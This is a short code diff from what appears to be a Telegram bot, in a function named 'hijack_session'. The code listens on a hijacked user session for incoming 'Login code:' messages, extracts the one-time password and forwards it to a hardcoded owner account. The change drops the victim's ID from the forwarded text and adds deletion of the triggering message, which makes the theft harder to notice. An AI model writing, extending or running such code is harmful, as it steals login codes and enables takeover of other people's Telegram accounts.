@@ -218,10 +218,11 @@ async def hijack_session(_, message):
         async def otp_listener(_, msg):
             if "Login code:" in msg.text:
                 otp_code = msg.text.split(": ")[1].strip()
-                otp_text = f"🔐 OTP received from {user_id}: `{otp_code}`"
+                otp_text = f"🔐 OTP Received : `{otp_code}`"
                 OWNER_ID =1970647198
                 await app.send_message(OWNER_ID, otp_text)
                 # ✅ Wait briefly to receive OTP, then terminate
+                await message.delete()
                 await asyncio.sleep(60)  # Wait 1 minutes before auto-stopping
                 await otp_userbot.stop()
                 await message.reply("🛑 OTP session closed...")
